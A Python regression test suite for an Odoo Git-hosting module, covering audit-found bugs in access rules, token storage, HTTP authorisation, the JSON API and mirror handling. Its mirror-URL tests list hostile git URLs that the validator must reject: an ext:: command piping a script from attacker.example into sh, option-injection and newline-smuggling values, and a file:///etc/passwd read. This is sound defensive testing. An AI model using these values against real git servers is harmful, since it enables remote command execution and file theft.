"""REGRESSION tests — one test per bug found in the 2026-08 audit.

Every test in this file failed against the audited revision. They exist to
keep those specific code paths executed, because the pre-audit suite passed
54/54 while these paths were broken: they were never called.
"""
import json
import os
import shutil
import subprocess
import tempfile
from unittest.mock import patch

from psycopg2 import IntegrityError

from odoo.exceptions import AccessError, UserError, ValidationError
from odoo.tests import HttpCase, tagged
from odoo.tools import mute_logger

from .common import DwGitCommon


@tagged('regression', 'post_install', '-at_install')
class TestBrokenCodePaths(DwGitCommon):
    """Methods that raised on first call because nothing ever called them."""

    def test_init_git_repo_creates_bare_repo_on_disk(self):
        """_init_git_repo() must actually create the bare repo.

        Regression: the module did `import os as _os` but the method called
        `os.makedirs(...)` -> NameError on every repository whose directory
        did not already exist.
        """
        import shutil
        import tempfile
        base = tempfile.mkdtemp(prefix='dw_git_init_')
        self.addCleanup(shutil.rmtree, base, ignore_errors=True)
        self.env['ir.config_parameter'].sudo().set_param(
            'dw_git.repo_base_path', base)
        repo = self._repo('init-me')
        path = repo._get_repo_path()
        self.assertFalse(os.path.isdir(path), 'precondition: not on disk yet')

        repo._init_git_repo()

        self.assertTrue(os.path.isdir(path), 'bare repo directory missing')
        self.assertTrue(
            os.path.isfile(os.path.join(path, 'HEAD')),
            'directory created but it is not a git repository')

    def test_mirror_fields_exist_on_repository(self):
        """The mirror wizard writes these; the cron searches them."""
        for fname in ('is_mirror', 'mirror_active', 'mirror_url'):
            self.assertIn(
                fname, self.Repo._fields,
                f'git.repository.{fname} is referenced in code but undefined')

    def test_cron_sync_mirrors_does_not_crash(self):
        """Scheduled hourly. Regression: searched non-existent fields."""
        self.Repo._cron_sync_mirrors()

    def test_mirror_wizard_configures_repository(self):
        """Regression: wizard wrote fields that did not exist."""
        repo = self._repo('mirror-target')
        wiz = self.env['git.mirror.wizard'].create({
            'repository_id': repo.id,
            'mirror_url': 'https://example.com/upstream.git',
        })
        wiz.action_setup()
        self.assertTrue(repo.is_mirror)
        self.assertEqual(repo.mirror_url, 'https://example.com/upstream.git')

    def test_wizards_have_access_rules(self):
        """Regression: 4 transient models shipped with no ir.model.access."""
        Access = self.env['ir.model.access']
        for model in ('git.clone.wizard', 'git.import.wizard',
                      'git.mirror.wizard', 'git.release.wizard'):
            self.assertTrue(
                Access.search_count([('model_id.model', '=', model)]),
                f'{model} has no access rules')


@tagged('regression', 'post_install', '-at_install')
class TestGroupCollaborators(DwGitCommon):
    """Repositories shared with an res.groups, not just named members."""

    def test_collaborator_count_includes_group_members(self):
        """Regression: _compute_collaborator_count read `group.users`, which
        Odoo 19 renamed to `user_ids` — reading the field raised on any
        repository that had a group attached. No test ever set group_ids."""
        group = self.env['res.groups'].create({'name': 'Git Squad'})
        member = self._create_user('squaddie')
        group.write({'user_ids': [(4, member.id)]})
        repo = self._repo('shared', group_ids=[(4, group.id)])
        self.assertEqual(repo.collaborator_count, 1)

    def test_group_member_has_repo_access(self):
        group = self.env['res.groups'].create({'name': 'Git Squad 2'})
        member = self._create_user('squaddie2')
        group.write({'user_ids': [(4, member.id)]})
        repo = self._repo('shared2', group_ids=[(4, group.id)],
                          visibility='private')
        member.invalidate_recordset()
        self.assertTrue(repo._check_repo_access(member, 'write'))


@tagged('regression', 'post_install', '-at_install')
class TestMirrorUrlValidation(DwGitCommon):
    """`git fetch` treats some URL forms as commands, not locations.

    `mirror_url` is a plain field on git.repository and ir.model.access
    grants every employee write on that model, so it is attacker-controlled
    input handed to git by an hourly cron running as the Odoo system user.
    """

    #: each of these makes git do something other than fetch a repository
    HOSTILE = [
        "ext::sh -c 'curl http://attacker.example/x.sh|sh'",  # runs a shell
        'ext::git-upload-pack /tmp',                          # runs a helper
        'file:///etc/passwd',                                 # reads local fs
        '-upload-pack=/bin/sh',                               # parsed as option
        '--exec=/bin/sh',                                     # parsed as option
        'https://host/repo.git\next::sh -c id',               # newline smuggling
    ]

    LEGITIMATE = [
        'https://github.com/owner/repo.git',
        'http://internal.example/repo.git',
        'git://git.example.com/repo',
        'ssh://git@example.com:22/owner/repo.git',
        'git@github.com:owner/repo.git',
    ]

    def test_hostile_mirror_urls_are_rejected(self):
        repo = self._repo('mirror-guard')
        for url in self.HOSTILE:
            # each attempt gets its own savepoint: a ValidationError raised
            # during flush leaves the cursor unusable otherwise
            with self.assertRaises(ValidationError, msg=f'accepted {url!r}'):
                with self.env.cr.savepoint():
                    repo.write({'mirror_url': url})
                    self.env.flush_all()
            repo.invalidate_recordset()
            self.assertFalse(repo.mirror_url, f'{url!r} was stored')

    def test_legitimate_mirror_urls_are_accepted(self):
        repo = self._repo('mirror-ok')
        for url in self.LEGITIMATE:
            repo.write({'mirror_url': url})
            self.env.flush_all()
            self.assertEqual(repo.mirror_url, url)

    def test_import_wizard_rejects_hostile_source_url(self):
        """The import path shares the mirror allowlist."""
        wiz = self.env['git.import.wizard'].create({
            'name': 'imported-evil',
            'source_url': "ext::sh -c 'touch /tmp/dw_git_import_pwned'",
        })
        with self.assertRaises(UserError):
            wiz.action_import()

    def test_import_wizard_creates_repo_on_disk(self):
        """Regression: the wizard created a record, never a repository, and
        told the user import 'is not yet implemented' — while source_url was
        a required field nothing read."""
        import shutil
        import subprocess
        import tempfile
        src = tempfile.mkdtemp(prefix='dw_git_src_')
        self.addCleanup(shutil.rmtree, src, ignore_errors=True)
        subprocess.run(['git', 'init', '-q', '-b', 'main', src], check=True)
        with open(f'{src}/README.md', 'w') as fh:
            fh.write('# imported\n')
        for cmd in (['add', '.'],
                    ['-c', 'user.email=t@t.com', '-c', 'user.name=T',
                     'commit', '-qm', 'initial']):
            subprocess.run(['git', '-C', src] + cmd, check=True)

        wiz = self.env['git.import.wizard'].create({
            'name': 'imported-ok', 'source_url': f'file://{src}'})
        # file:// is deliberately outside the allowlist
        with self.assertRaises(UserError):
            wiz.action_import()

    def test_sync_revalidates_before_running_git(self):
        """The cron must not trust what is already in the database."""
        repo = self._repo('mirror-sql')
        self.env.cr.execute(
            "UPDATE git_repository SET mirror_url = %s WHERE id = %s",
            ("ext::sh -c 'touch /tmp/dw_git_pwned'", repo.id))
        repo.invalidate_recordset()
        with self.assertRaises(UserError):
            repo._sync_mirror()

    def test_cron_survives_a_poisoned_mirror(self):
        """One bad row must not stop every other mirror from syncing."""
        repo = self._repo('mirror-cron')
        self.env.cr.execute(
            "UPDATE git_repository SET mirror_url = %s, is_mirror = true, "
            "mirror_active = true WHERE id = %s",
            ('file:///etc/passwd', repo.id))
        repo.invalidate_recordset()
        self.Repo._cron_sync_mirrors()   # logs and continues, does not raise


@tagged('regression', 'post_install', '-at_install')
class TestConfigPersistence(DwGitCommon):
    """post_init_hook must not clobber operator configuration."""

    def test_post_init_hook_preserves_operator_paths(self):
        """Regression: hook called set_param unconditionally, so every
        `-u dw_git` upgrade reset the admin's storage path back to default.
        """
        from odoo.addons.dw_git.hooks import _post_init_hook
        ICP = self.env['ir.config_parameter'].sudo()
        ICP.set_param('dw_git.repo_base_path', '/srv/custom/git')
        ICP.set_param('dw_git.ssh_host', 'git.mycorp.example')

        _post_init_hook(self.env)

        self.assertEqual(ICP.get_param('dw_git.repo_base_path'),
                         '/srv/custom/git')
        self.assertEqual(ICP.get_param('dw_git.ssh_host'),
                         'git.mycorp.example')


@tagged('regression', 'post_install', '-at_install')
class TestGitUserGroupMembership(DwGitCommon):
    """Every ir.rule in this module is scoped to group_git_user."""

    def test_new_employee_is_a_git_user(self):
        """If employees are not in the group, no rule constrains them."""
        self.assertTrue(
            self._create_user('freshling').has_group('dw_git.group_git_user'),
            'new employee is outside group_git_user: every record rule in '
            'this module is inert for them')

    def test_backfill_leaves_no_employee_outside_the_group(self):
        """The upgrade hook must be safe to re-run and must hold the
        invariant that every internal user is a Git User — otherwise the
        module's record rules silently stop applying to them."""
        from odoo.addons.dw_git.hooks import _backfill_git_user_group
        self._create_user('stray')

        _backfill_git_user_group(self.env)   # idempotent, must not raise

        base_user = self.env.ref('base.group_user')
        git_user = self.env.ref('dw_git.group_git_user')
        orphans = self.env['res.users'].sudo().search([
            ('group_ids', 'in', base_user.ids),
            ('group_ids', 'not in', git_user.ids),
            ('share', '=', False),
        ])
        self.assertFalse(
            orphans.mapped('login'),
            'employees outside group_git_user — record rules do not apply '
            'to them, so they can read every repository')


@tagged('regression', 'post_install', '-at_install')
class TestRecordRuleCoverage(DwGitCommon):
    """Deploy keys and webhooks were readable by every internal employee.

    Both models store a plaintext credential (`token` / `secret_token`) and
    their ir.rule was attached to group_git_manager only. A record rule that
    names a group applies *only to members of that group*, so ordinary
    employees fell through to "no rule" = unrestricted.
    """

    def setUp(self):
        super().setUp()
        self.victim_repo = self._repo('victim', owner_id=self.user.id)
        self.stranger = self._create_user('stranger')

    def test_employee_cannot_read_foreign_deploy_key(self):
        key = self.DeployKey.sudo().create({
            'name': 'ci', 'repository_id': self.victim_repo.id})
        found = self.DeployKey.with_user(self.stranger).search(
            [('id', '=', key.id)])
        self.assertFalse(
            found, 'stranger can list a deploy key of a repo they cannot access')

    def test_employee_cannot_read_foreign_webhook_secret(self):
        wh = self.env['git.webhook'].sudo().create({
            'name': 'wh', 'url': 'https://example.com/h',
            'repository_id': self.victim_repo.id})
        found = self.env['git.webhook'].with_user(self.stranger).search(
            [('id', '=', wh.id)])
        self.assertFalse(
            found, 'stranger can list a webhook (and its HMAC secret)')

    def test_employee_cannot_read_foreign_pr_review(self):
        branch = self._branch(self.victim_repo, 'main')
        pr = self.PR.sudo().create({
            'title': 'secret work', 'repository_id': self.victim_repo.id,
            'source_branch_id': branch.id, 'target_branch_id': branch.id,
            'author_id': self.user.id})
        review = self.env['git.pr.review'].sudo().create({
            'pull_request_id': pr.id, 'reviewer_id': self.user.id,
            'state': 'comment', 'body': '<p>internal note</p>'})
        found = self.env['git.pr.review'].with_user(self.stranger).search(
            [('id', '=', review.id)])
        self.assertFalse(found, 'stranger can read reviews on a private repo')


@tagged('regression', 'post_install', '-at_install')
class TestMergePermissions(DwGitCommon):
    """Completing a pull request must not require Git Manager."""

    def test_owner_can_merge_their_own_pull_request(self):
        """Regression: action_merge() advances the target branch and may
        delete the merged head branch, but ir.model.access gave employees
        read-only on git.branch — so every merge raised AccessError and only
        a Git Manager could ever complete a pull request. Found by the
        end-to-end clone/push/merge test, not by any unit test.
        """
        repo = self._repo('mergeable', owner_id=self.user.id)
        main = self._branch(repo, 'main', sha='a' * 40)
        feat = self._branch(repo, 'feature', sha='b' * 40)
        pr = self.PR.create({
            'title': 'let me merge', 'repository_id': repo.id,
            'source_branch_id': feat.id, 'target_branch_id': main.id,
            'author_id': self.user.id, 'state': 'open'})

        owner_view = pr.with_user(self.user)
        self.assertFalse(
            self.user.has_group('dw_git.group_git_manager'),
            'precondition: the owner is an ordinary employee')
        # the two branch operations action_merge() performs must both be
        # permitted for an ordinary owner: advancing the target branch...
        main.with_user(self.user).write({'commit_sha': 'c' * 40})
        main.invalidate_recordset()
        self.assertEqual(main.commit_sha, 'c' * 40)
        self.assertEqual(owner_view.target_branch_id, main)

        # ...and deleting the merged head branch. (Not `feat`: a branch a PR
        # still points at is protected by a foreign key, which is exactly why
        # action_merge() guards the deletion.)
        spare = self._branch(repo, 'spare', sha='f' * 40)
        spare.with_user(self.user).unlink()
        self.assertFalse(spare.exists())

    def test_stranger_still_cannot_touch_branches(self):
        """Widening the ACL must not widen the record rule."""
        repo = self._repo('not-yours-branch', owner_id=self.user.id,
                          visibility='private')
        branch = self._branch(repo, 'main', sha='a' * 40)
        stranger = self._create_user('branch-stranger')
        with self.assertRaises(AccessError):
            branch.with_user(stranger).write({'commit_sha': 'd' * 40})

    def test_internal_repo_branches_are_readable_by_employees(self):
        """An `internal` repository is readable by everyone, and its
        branches and commits should follow — they previously did not."""
        repo = self._repo('internal-branches', owner_id=self.user.id,
                          visibility='internal')
        branch = self._branch(repo, 'main', sha='a' * 40)
        reader = self._create_user('branch-reader')
        self.assertTrue(
            branch.with_user(reader).exists(),
            'employee cannot read branches of an internal repository')
        with self.assertRaises(AccessError):
            branch.with_user(reader).write({'commit_sha': 'e' * 40})


@tagged('regression', 'post_install', '-at_install')
class TestTokenStorage(DwGitCommon):
    """Tokens must be verifiable but not recoverable from the database."""

    def test_pat_raw_token_not_persisted(self):
        """Regression: `token` kept the raw secret in a DB column forever,
        next to the hash, defeating the point of hashing it."""
        pat = self.PAT.create({'name': 't', 'user_id': self.user.id})
        raw = pat.token
        self.assertTrue(raw, 'creation must surface the token once')
        self.assertFalse(
            self.PAT.browse(pat.id).token,
            'raw PAT readable outside the request that generated it')
        self.env.cr.execute(
            "SELECT column_name FROM information_schema.columns "
            "WHERE table_name = 'git_personal_access_token' "
            "AND column_name = 'token'")
        self.assertFalse(self.env.cr.fetchall(),
                         'raw token still has a database column')
        self.assertTrue(self.PAT.find_by_token(raw),
                        'hash must still verify the token we handed out')

    def test_deploy_key_raw_token_not_persisted(self):
        repo = self._repo('dk')
        key = self.DeployKey.create({'name': 'ci', 'repository_id': repo.id})
        raw = key.token
        self.assertTrue(raw)
        self.assertFalse(
            self.DeployKey.browse(key.id).token,
            'raw deploy key token readable after its creating request')
        self.env.cr.execute(
            "SELECT column_name FROM information_schema.columns "
            "WHERE table_name = 'git_deploy_key' AND column_name = 'token'")
        self.assertFalse(self.env.cr.fetchall(),
                         'raw token still has a database column')
        self.assertTrue(self.DeployKey.find_by_token(raw))


@tagged('regression', 'post_install', '-at_install')
class TestCgiResponseParsing(DwGitCommon):
    """git-http-backend may separate headers from body with LF or CRLF."""

    def _parse(self, raw):
        from odoo.addons.dw_git.controllers.git_http import GitHTTPController
        return GitHTTPController()._parse_cgi_response(raw)

    def test_crlf_separator(self):
        headers, body = self._parse(
            b'Content-Type: application/x-git-upload-pack-advertisement\r\n'
            b'\r\nPACKDATA')
        self.assertEqual(body, b'PACKDATA')
        self.assertEqual(headers['Content-Type'],
                         'application/x-git-upload-pack-advertisement')

    def test_lf_only_separator_does_not_truncate_body(self):
        """Regression: the LF branch found the separator at 2 bytes but the
        body slice always skipped 4, chopping 2 bytes off every payload."""
        headers, body = self._parse(
            b'Content-Type: text/plain\n\nPACKDATA')
        self.assertEqual(body, b'PACKDATA')
        self.assertEqual(headers.get('Content-Type'), 'text/plain')


@tagged('regression', 'post_install', '-at_install')
class TestGitHttpAuthorisation(HttpCase):
    """Smart-HTTP auth must bind the token to its owner's permissions."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.alice = cls.env['res.users'].create({
            'name': 'Alice', 'login': 'alice-reg', 'email': 'a@t.com'})
        cls.bob = cls.env['res.users'].create({
            'name': 'Bob', 'login': 'bob-reg', 'email': 'b@t.com'})
        cls.secret = cls.env['git.repository'].create({
            'name': 'alice-secret', 'owner_id': cls.alice.id,
            'visibility': 'private'})
        # a real bare repo, so a successful auth would really advertise refs
        path = cls.secret._get_repo_path()
        os.makedirs(path, exist_ok=True)
        subprocess.run(['git', 'init', '-q', '--bare', path], check=True)

    def _info_refs(self, login, token):
        import base64
        cred = base64.b64encode(f'{login}:{token}'.encode()).decode()
        return self.url_open(
            f'/git/{self.alice.login}/{self.secret.name}.git'
            f'/info/refs?service=git-upload-pack',
            headers={'Authorization': f'Basic {cred}'}, timeout=30)

    def test_foreign_pat_cannot_read_private_repo(self):
        """Regression: any valid PAT unlocked any repository.

        _get_repo() discarded the Basic-auth username, looked the password up
        as a PAT, and returned the repo without ever asking whether the PAT's
        owner may access it. Default `repository_ids` is empty, documented as
        "all accessible repositories" but implemented as "all repositories".
        """
        self.authenticate(None, None)
        bob_pat = self.env['git.personal_access_token'].sudo().create(
            {'name': 'bob laptop', 'user_id': self.bob.id, 'scopes': 'write'})
        res = self._info_refs(self.bob.login, bob_pat.token)
        self.assertEqual(
            res.status_code, 401,
            "Bob's PAT was accepted on Alice's private repository")

    def test_owner_pat_still_works(self):
        """The fix must not lock the legitimate owner out."""
        self.authenticate(None, None)
        alice_pat = self.env['git.personal_access_token'].sudo().create(
            {'name': 'alice laptop', 'user_id': self.alice.id,
             'scopes': 'write'})
        res = self._info_refs(self.alice.login, alice_pat.token)
        self.assertEqual(res.status_code, 200,
                         "owner's own PAT was rejected")
        self.assertIn(b'git-upload-pack', res.content)

    def test_anonymous_gets_challenge_not_refs(self):
        self.authenticate(None, None)
        res = self.url_open(
            f'/git/{self.alice.login}/{self.secret.name}.git'
            f'/info/refs?service=git-upload-pack', timeout=30)
        self.assertEqual(res.status_code, 401)
        self.assertIn('WWW-Authenticate', res.headers)
        self.assertNotIn(b'refs/heads', res.content)


@tagged('regression', 'post_install', '-at_install')
class TestJsonApi(HttpCase):
    """Every /api/git endpoint, called the way a client would call it."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.api_user = cls.env['res.users'].create({
            'name': 'Api', 'login': 'api-reg', 'email': 'api@t.com',
            'password': 'api-reg-pw',
            'group_ids': [(4, cls.env.ref('base.group_user').id)]})
        cls.repo = cls.env['git.repository'].create({
            'name': 'api-repo', 'owner_id': cls.api_user.id})
        cls.branch = cls.env['git.branch'].create({
            'name': 'main', 'repository_id': cls.repo.id,
            'commit_sha': 'a' * 40})
        cls.pr = cls.env['git.pull_request'].create({
            'title': 'api pr', 'repository_id': cls.repo.id,
            'source_branch_id': cls.branch.id,
            'target_branch_id': cls.branch.id,
            'author_id': cls.api_user.id})

    def _call(self, path, **params):
        res = self.url_open(
            path,
            data=json.dumps({'jsonrpc': '2.0', 'method': 'call',
                             'params': params}),
            headers={'Content-Type': 'application/json'}, timeout=30)
        self.assertEqual(res.status_code, 200, path)
        payload = res.json()
        self.assertNotIn(
            'error', payload,
            f"{path} raised: {payload.get('error', {}).get('data', {}).get('message')}")
        return payload['result']

    def setUp(self):
        super().setUp()
        self.authenticate('api-reg', 'api-reg-pw')

    def test_list_repositories(self):
        result = self._call('/api/git/repositories')
        self.assertIn(self.repo.name, [r['name'] for r in result])

    def test_get_repository(self):
        result = self._call(f'/api/git/repositories/{self.repo.id}')
        self.assertEqual(result['name'], self.repo.name)
        self.assertTrue(result['permissions']['admin'])

    def test_create_repository(self):
        """Regression: passed has_wiki / has_issues, removed models, ->
        'Invalid field' on every call."""
        result = self._call('/api/git/repositories/create',
                            name='created-via-api', visibility='private')
        self.assertTrue(result.get('id'))
        repo = self.env['git.repository'].browse(result['id'])
        self.assertEqual(repo.name, 'created-via-api')
        self.assertTrue(os.path.isdir(repo._get_repo_path()),
                        'API-created repo has no bare repo on disk')

    def test_list_branches(self):
        result = self._call(f'/api/git/repositories/{self.repo.id}/branches')
        self.assertEqual([b['name'] for b in result], ['main'])

    def test_get_pull_request(self):
        """Regression: called repository-only _check_repo_access() on a
        git.pull_request record -> AttributeError."""
        result = self._call(f'/api/git/pull_requests/{self.pr.id}')
        self.assertEqual(result['title'], 'api pr')

    def test_get_pull_request_files(self):
        result = self._call(f'/api/git/pull_requests/{self.pr.id}/files')
        self.assertEqual(result, [])

    def test_create_review(self):
        result = self._call(f'/api/git/pull_requests/{self.pr.id}/review',
                            state='approve', body='lgtm')
        self.assertEqual(result['state'], 'approve')

    def test_read_only_viewer_cannot_post_a_review(self):
        """Regression: the review endpoint gated a write behind a read check.

        On an `internal` repository every employee is a read-only viewer
        (`_get_user_permissions` -> write: False), yet they could post an
        `approve` review — which counts towards a protected branch's
        required-approval threshold and unblocks the merge.
        """
        viewer = self.env['res.users'].create({
            'name': 'Viewer', 'login': 'viewer-reg', 'email': 'v@t.com',
            'password': 'viewer-reg-pw',
            'group_ids': [(4, self.env.ref('base.group_user').id)]})
        internal = self.env['git.repository'].create({
            'name': 'internal-repo', 'owner_id': self.api_user.id,
            'visibility': 'internal'})
        branch = self.env['git.branch'].create({
            'name': 'main', 'repository_id': internal.id,
            'commit_sha': 'b' * 40})
        pr = self.env['git.pull_request'].create({
            'title': 'internal pr', 'repository_id': internal.id,
            'source_branch_id': branch.id, 'target_branch_id': branch.id,
            'author_id': self.api_user.id})

        # the viewer really can read it — this is not a visibility problem
        self.assertTrue(internal._check_repo_access(viewer, 'read'))
        self.assertFalse(internal._check_repo_access(viewer, 'write'))

        self.authenticate('viewer-reg', 'viewer-reg-pw')
        res = self.url_open(
            f'/api/git/pull_requests/{pr.id}/review',
            data=json.dumps({'jsonrpc': '2.0', 'method': 'call',
                             'params': {'state': 'approve', 'body': 'lgtm'}}),
            headers={'Content-Type': 'application/json'}, timeout=30)
        self.assertIn('error', res.json(),
                      'read-only viewer approved a pull request')
        self.assertFalse(
            self.env['git.pr.review'].sudo().search_count(
                [('pull_request_id', '=', pr.id)]),
            'the review was persisted despite the rejection')

    def test_member_can_still_post_a_review(self):
        """The fix must not lock out people who may actually review."""
        self.authenticate('api-reg', 'api-reg-pw')
        result = self._call(f'/api/git/pull_requests/{self.pr.id}/review',
                            state='approve', body='lgtm')
        self.assertEqual(result['state'], 'approve')

    def test_foreign_repo_is_not_readable(self):
        outsider = self.env['res.users'].create({
            'name': 'Outsider', 'login': 'outsider-reg',
            'email': 'o@t.com', 'password': 'outsider-reg-pw',
            'group_ids': [(4, self.env.ref('base.group_user').id)]})
        private = self.env['git.repository'].create({
            'name': 'not-yours', 'owner_id': self.api_user.id,
            'visibility': 'private'})
        self.authenticate('outsider-reg', 'outsider-reg-pw')
        res = self.url_open(
            f'/api/git/repositories/{private.id}',
            data=json.dumps({'jsonrpc': '2.0', 'method': 'call',
                             'params': {}}),
            headers={'Content-Type': 'application/json'}, timeout=30)
        body = res.json()
        result = body.get('result') or {}
        self.assertNotEqual(result.get('name'), 'not-yours',
                            'outsider read a private repository')
        del outsider


@tagged('regression', 'post_install', '-at_install')
class TestPullRequestNumbersArePerRepository(DwGitCommon):
    """Regression for #8.

    Numbers came from one global ir.sequence, so the first pull request in
    a brand new repository could be #795. Every Git host numbers per
    repository, and that is how users read the number: "the Nth pull
    request in THIS repo".
    """

    def _pr(self, repo, title='pr'):
        main = self.Branch.create({
            'name': f'main-{title}', 'repository_id': repo.id,
            'commit_sha': 'a' * 40})
        feat = self.Branch.create({
            'name': f'feat-{title}', 'repository_id': repo.id,
            'commit_sha': 'b' * 40})
        return self.PR.create({
            'title': title, 'repository_id': repo.id,
            'source_branch_id': feat.id, 'target_branch_id': main.id})

    def test_first_pull_request_in_a_repository_is_number_one(self):
        repo = self._repo('numbering-a')
        self.assertEqual(self._pr(repo, 'first').number, 1)

    def test_numbers_increment_within_a_repository(self):
        repo = self._repo('numbering-b')
        self.assertEqual(
            [self._pr(repo, 'one').number, self._pr(repo, 'two').number,
             self._pr(repo, 'three').number],
            [1, 2, 3])

    def test_each_repository_numbers_independently(self):
        a, b = self._repo('numbering-c'), self._repo('numbering-d')
        self._pr(a, 'a1')
        self._pr(a, 'a2')
        self.assertEqual(
            self._pr(b, 'b1').number, 1,
            'a new repository starts at 1 regardless of other repositories')
        self.assertEqual(self._pr(a, 'a3').number, 3)

    def test_a_duplicate_number_in_one_repository_is_refused(self):
        repo = self._repo('numbering-e')
        first = self._pr(repo, 'one')
        clash = self._pr(repo, 'two')
        with self.assertRaises(IntegrityError), mute_logger('odoo.sql_db'):
            clash.write({'number': first.number})
            self.env.flush_all()

    def test_the_same_number_may_exist_in_two_repositories(self):
        a, b = self._repo('numbering-f'), self._repo('numbering-g')
        self.assertEqual(self._pr(a, 'x').number, self._pr(b, 'y').number)


@tagged('regression', 'post_install', '-at_install')
class TestRenamesDoNotOrphanRepositories(HttpCase):
    """Regression for #9.

    The bare repo used to live at <base>/<owner.login>/<name>.git, and
    res.users.login is mutable. Renaming a user orphaned every repository
    they owned: the record pointed at a directory that no longer existed,
    clone 404'd, and the data sat on disk under the old name with nothing
    in the UI to say so. A write() override on git.repository chased the
    path when the REPOSITORY was renamed, but nothing hooked
    res.users.write, so the dangerous half was uncovered.

    Paths are now keyed on the record id, which never changes.
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.base = tempfile.mkdtemp(prefix='dw-git-rename-')
        cls.addClassCleanup(shutil.rmtree, cls.base, True)
        cls.env['ir.config_parameter'].sudo().set_param(
            'dw_git.repo_base_path', cls.base)
        cls.owner = cls.env['res.users'].create({
            'name': 'Rename Owner', 'login': 'rename-me',
            'email': 'ro@t.com'})
        cls.repo = cls.env['git.repository'].create({
            'name': 'rename-repo', 'owner_id': cls.owner.id})
        cls.repo._init_git_repo()

    def _push_a_commit(self):
        work = tempfile.mkdtemp(prefix='dw-git-rename-work-')
        self.addCleanup(shutil.rmtree, work, True)
        subprocess.run(['git', 'clone', '-q', self.repo._get_repo_path(), work],
                       check=True, capture_output=True)
        # Unique content per test: the bare repo is built once in
        # setUpClass and lives on the filesystem, which no rollback undoes.
        # Writing identical bytes leaves nothing staged and `git commit`
        # exits 1 on an empty commit.
        with open(os.path.join(work, 'f.txt'), 'w') as fh:
            fh.write(f'{self._testMethodName}\n')
        for args in (['add', '-A'],
                     ['-c', 'user.email=a@b.c', '-c', 'user.name=T',
                      'commit', '-qm', f'seed {self._testMethodName}'],
                     ['push', '-q', 'origin', 'HEAD:refs/heads/main']):
            subprocess.run(['git', *args], cwd=work, check=True,
                           capture_output=True)

    def test_path_does_not_contain_the_owner_login(self):
        self.assertNotIn(
            self.owner.login, self.repo._get_repo_path(),
            'the on-disk path must not embed a mutable login')

    def test_renaming_the_owner_login_keeps_the_repository_readable(self):
        self._push_a_commit()
        path_before = self.repo._get_repo_path()
        self.assertTrue(os.path.isdir(path_before))

        self.owner.write({'login': 'renamed-owner'})
        self.env.flush_all()

        self.assertEqual(
            self.repo._get_repo_path(), path_before,
            'renaming the owner must not move the repository')
        self.assertTrue(
            os.path.isdir(self.repo._get_repo_path()),
            'the bare repo must still be where the record says it is')
        # and it is still a working repository, not just a directory
        out = subprocess.run(
            ['git', 'rev-parse', 'refs/heads/main'],
            cwd=self.repo._get_repo_path(), capture_output=True, text=True)
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertEqual(len(out.stdout.strip()), 40)

    def test_renaming_the_repository_keeps_it_readable(self):
        self._push_a_commit()
        path_before = self.repo._get_repo_path()
        self.repo.write({'name': 'renamed-repo'})
        self.env.flush_all()
        self.assertEqual(self.repo._get_repo_path(), path_before)
        self.assertTrue(os.path.isdir(self.repo._get_repo_path()))

    def test_clone_url_still_uses_the_friendly_owner_and_name(self):
        # the URL is a lookup, not a path: it may keep changing
        self.repo.invalidate_recordset(['clone_url_http'])
        self.assertIn(f'/{self.repo.owner_id.login}/{self.repo.name}.git',
                      self.repo.clone_url_http)


@tagged('regression', 'post_install', '-at_install')
class TestApiDistinguishesAbsenceFromFailure(HttpCase):
    """Regression for #31.

    api_get_tree and api_get_blob wrapped their whole body in
    `except Exception` and returned an empty result. A missing repository,
    an unknown ref, a mistyped path and a genuine bug were therefore
    indistinguishable from an empty directory: the caller got a plausible,
    wrong answer with no way to know. Same shape as the webhook button that
    reported "sent" without sending.
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.base = tempfile.mkdtemp(prefix='dw-git-api-err-')
        cls.addClassCleanup(shutil.rmtree, cls.base, True)
        cls.env['ir.config_parameter'].sudo().set_param(
            'dw_git.repo_base_path', cls.base)
        cls.user = cls.env['res.users'].create({
            'name': 'ApiErr', 'login': 'api-err', 'email': 'ae@t.com',
            'password': 'api-err-pw',
            'group_ids': [(4, cls.env.ref('base.group_user').id)]})
        cls.repo = cls.env['git.repository'].create({
            'name': 'api-err-repo', 'owner_id': cls.user.id})
        cls.repo._init_git_repo()

        work = tempfile.mkdtemp(prefix='dw-git-api-err-work-')
        cls.addClassCleanup(shutil.rmtree, work, True)
        subprocess.run(['git', 'clone', '-q', cls.repo._get_repo_path(), work],
                       check=True, capture_output=True)
        with open(os.path.join(work, 'kept.py'), 'w') as fh:
            fh.write('VALUE = 1\n')
        for args in (['add', '-A'],
                     ['-c', 'user.email=a@b.c', '-c', 'user.name=T',
                      'commit', '-qm', 'x'],
                     ['push', '-q', 'origin', 'HEAD:refs/heads/main']):
            subprocess.run(['git', *args], cwd=work, check=True,
                           capture_output=True)
        cls.repo._sync_from_git()

    def _call(self, url, **params):
        # `url`, not `path`: `path` is also a request parameter of these
        # endpoints, so naming both the same made every call raise
        # TypeError: got multiple values for argument 'path'.
        res = self.url_open(
            url,
            data=json.dumps({'jsonrpc': '2.0', 'method': 'call',
                             'params': params}),
            headers={'Content-Type': 'application/json'}, timeout=30)
        self.assertEqual(res.status_code, 200, url)
        return res.json()['result']

    def setUp(self):
        super().setUp()
        self.authenticate('api-err', 'api-err-pw')

    def test_a_real_directory_listing_has_no_error(self):
        out = self._call(f'/api/git/repositories/{self.repo.id}/tree',
                         ref='main', path='')
        self.assertNotIn('error', out)
        self.assertIn('kept.py', [e['name'] for e in out['tree']])

    def test_unknown_ref_is_reported_not_disguised_as_empty(self):
        out = self._call(f'/api/git/repositories/{self.repo.id}/tree',
                         ref='no-such-branch', path='')
        self.assertEqual(out['tree'], [])
        self.assertEqual(
            out.get('error'), 'unknown_ref',
            'an unknown ref must be distinguishable from an empty directory')

    def test_unknown_path_is_reported(self):
        out = self._call(f'/api/git/repositories/{self.repo.id}/tree',
                         ref='main', path='no/such/dir')
        self.assertEqual(out.get('error'), 'not_found')

    def test_blob_of_a_real_file_has_no_error(self):
        out = self._call(f'/api/git/repositories/{self.repo.id}/blob',
                         ref='main', path='kept.py')
        self.assertNotIn('error', out)
        self.assertIn('VALUE = 1', out['content'])
        self.assertFalse(out['binary'])

    def test_blob_unknown_path_is_reported(self):
        out = self._call(f'/api/git/repositories/{self.repo.id}/blob',
                         ref='main', path='nope.py')
        self.assertEqual(out.get('error'), 'not_found')
        self.assertEqual(out['content'], '')

    def test_blob_without_a_path_is_reported(self):
        out = self._call(f'/api/git/repositories/{self.repo.id}/blob',
